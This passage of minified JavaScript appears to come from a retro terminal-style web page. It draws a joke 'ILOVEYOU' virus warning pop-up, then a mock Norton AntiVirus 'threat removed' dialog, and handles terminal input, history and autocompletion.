        <div style="font-weight: bold; margin-bottom: 5px;">SYSTEM WARNING</div>
        <div>VBS.LoveLetter.A virus detected in 'LOVELETTER.VBS.TXT'</div>
      </div>
    </div>
    <div style="margin-bottom: 15px; font-size: 12px;">This virus sends itself to all contacts in your address book and may delete files with certain extensions.</div>
    <div style="font-size: 12px; margin-bottom: 20px;">Kindly validate your identity by responding to this message:</div>
    <div style="text-align: center; margin-bottom: 15px; font-weight: bold; color: #aa0000;">
      KINDLY SEND THIS MAIL TO SOMEONE YOU CARE ABOUT
    </div>
    <div style="display: flex; justify-content: flex-end; gap: 8px;">
      <button id="iLoveYouOK" style="padding: 3px 12px; background: #efefef; border: 2px outset #dfdfdf; cursor: pointer;">OK</button>
      <button id="iLoveYouCancel" style="padding: 3px 12px; background: #efefef; border: 2px outset #dfdfdf; cursor: pointer;">Cancel</button>
    </div>
  `,e.appendChild(t),e.appendChild(n),document.body.appendChild(e);let o=!1,a,i;t.addEventListener("mousedown",function(t){if("\xd7"===t.target.textContent)return;o=!0;let n=e.getBoundingClientRect();a=t.clientX-n.left,i=t.clientY-n.top,t.preventDefault()}),document.addEventListener("mousemove",function(t){if(!o)return;let n=t.clientX-a,s=t.clientY-i;e.style.left=n+"px",e.style.top=s+"px",e.style.transform="none"}),document.addEventListener("mouseup",function(){o=!1});let s=function(){let e=document.createElement("div");e.style.position="fixed",e.style.top="50%",e.style.left="50%",e.style.transform="translate(-50%, -50%)",e.style.width="420px",e.style.backgroundColor="#f0f0f0",e.style.border="2px solid #00478f",e.style.borderRadius="0px",e.style.padding="2px",e.style.boxShadow="5px 5px 10px rgba(0, 0, 0, 0.5)",e.style.zIndex="9999",e.style.fontFamily="Tahoma, Arial, sans-serif",e.style.color="#000000";let t=document.createElement("div");t.style.backgroundColor="#00478f",t.style.color="white",t.style.padding="4px 8px",t.style.fontWeight="bold",t.style.display="flex",t.style.justifyContent="space-between",t.style.alignItems="center",t.style.cursor="move",t.innerHTML='<div style="display: flex; align-items: center;"><div style="width: 16px; height: 16px; background-color: #fff; border-radius: 50%; margin-right: 8px;"></div>Norton AntiVirus</div><span style="cursor: pointer;">\xd7</span>';let n=document.createElement("div");n.style.padding="15px",n.style.backgroundColor="#f9f9f9",n.style.border="1px solid #ccc",n.style.margin="2px",n.innerHTML=`
      <div style="display: flex; margin-bottom: 15px;">
        <div style="margin-right: 15px;">
          <div style="width: 48px; height: 48px; background-color: #009900; border-radius: 50%; display: flex; justify-content: center; align-items: center; color: white; font-size: 28px; font-weight: bold;">✓</div>
        </div>
        <div>
          <div style="font-weight: bold; font-size: 14px; margin-bottom: 5px; color: #004080;">Threat Successfully Removed</div>
          <div style="font-size: 12px; margin-bottom: 10px;">Norton AntiVirus has detected and neutralized a virus on your system.</div>
          <div style="font-size: 12px;">
            <div><span style="font-weight: bold;">Threat name:</span> VBS.LoveLetter.A</div>
            <div><span style="font-weight: bold;">Location:</span> C:\\Documents\\loveletter.vbs.txt</div>
            <div><span style="font-weight: bold;">Action taken:</span> File quarantined</div>
            <div><span style="font-weight: bold;">Status:</span> System protected</div>
          </div>
        </div>
      </div>
      <div style="font-size: 11px; color: #666; border-top: 1px solid #ddd; padding-top: 10px; margin-bottom: 15px;">
        This potentially dangerous file has been quarantined and can no longer harm your system. No further action is required.
      </div>
      <div style="display: flex; justify-content: center;">
        <button id="antivirusClose" style="padding: 3px 20px; background: #f0f0f0; border: 1px outset #ccc; font-size: 12px; cursor: pointer;">Close</button>
      </div>
    `,e.appendChild(t),e.appendChild(n),document.body.appendChild(e);let o=!1,a,i;t.addEventListener("mousedown",function(t){if("\xd7"===t.target.textContent)return;o=!0;let n=e.getBoundingClientRect();a=t.clientX-n.left,i=t.clientY-n.top,t.preventDefault()}),document.addEventListener("mousemove",function(t){if(!o)return;let n=t.clientX-a,s=t.clientY-i;e.style.left=n+"px",e.style.top=s+"px",e.style.transform="none"}),document.addEventListener("mouseup",function(){o=!1});let s=document.getElementById("antivirusClose");s.addEventListener("mouseover",function(){this.style.backgroundColor="#e0e0e0"}),s.addEventListener("mouseout",function(){this.style.backgroundColor="#f0f0f0"}),s.addEventListener("mousedown",function(){this.style.border="1px inset #ccc"}),s.addEventListener("mouseup",function(){this.style.border="1px outset #ccc"}),s.addEventListener("click",function(){document.body.removeChild(e)}),t.querySelector("span").addEventListener("click",function(){document.body.removeChild(e)})},r=document.getElementById("iLoveYouOK"),l=document.getElementById("iLoveYouCancel");[r,l].forEach(t=>{t.addEventListener("mouseover",function(){this.style.backgroundColor="#e0e0e0"}),t.addEventListener("mouseout",function(){this.style.backgroundColor="#efefef"}),t.addEventListener("mousedown",function(){this.style.border="2px inset #dfdfdf"}),t.addEventListener("mouseup",function(){this.style.border="2px outset #dfdfdf"}),t.addEventListener("click",function(){this.style.border="2px inset #dfdfdf",setTimeout(()=>{document.body.removeChild(e),setTimeout(()=>{s()},500)},300)})}),t.querySelector("span:last-child").addEventListener("click",function(){document.body.removeChild(e)})}responses.help=updatedHelpText,delete responses.fortune,userInput.addEventListener("keydown",function(e){if("Enter"===e.key){let t=userInput.value.trim();t&&(commandHistory.push(t),historyIndex=commandHistory.length,processInput(t)),userInput.value=""}else if("ArrowUp"===e.key)e.preventDefault(),historyIndex>0&&(historyIndex--,userInput.value=commandHistory[historyIndex]);else if("ArrowDown"===e.key)e.preventDefault(),historyIndex<commandHistory.length-1?(historyIndex++,userInput.value=commandHistory[historyIndex]):(historyIndex=commandHistory.length,userInput.value="");else if("Tab"===e.key)return e.preventDefault(),e.stopPropagation(),autocompleteCommand(),setTimeout(()=>userInput.focus(),0),!1}),userInput.addEventListener("input",function(){document.documentElement.style.setProperty("--input-width",this.value.length)}),userInput.addEventListener("input",initializeCursor),userInput.addEventListener("keydown",function(e){setTimeout(initializeCursor,0)}),window.addEventListener("load",()=>{let e=document.getElementById("inputLine");e.style.display="none",setTimeout(()=>{simulateConnection()},10),window.addEventListener("resize",initializeCursor)});